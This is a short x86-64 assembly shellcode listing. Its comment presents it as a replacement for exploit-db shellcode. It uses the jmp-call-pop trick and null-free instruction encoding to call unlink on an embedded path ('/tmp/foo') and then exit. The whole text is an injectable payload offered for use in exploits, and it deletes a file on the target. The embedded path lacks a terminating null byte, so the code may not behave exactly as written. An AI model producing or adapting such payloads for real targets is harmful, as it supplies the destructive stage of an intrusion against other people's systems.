;; The stuff on exploit-db was crap so I gave it a whirl

section .text
	global _start
_start:
	jmp file
main:
	xor rax,rax ;; prep result
	pop rdi	    ;; filepath arg
	add al,87   ;; unlink()
	syscall
	
	xor rax,rax ;; prep result
	add al,60   ;; exit()
	syscall
file:
	call main
	db '/tmp/foo'
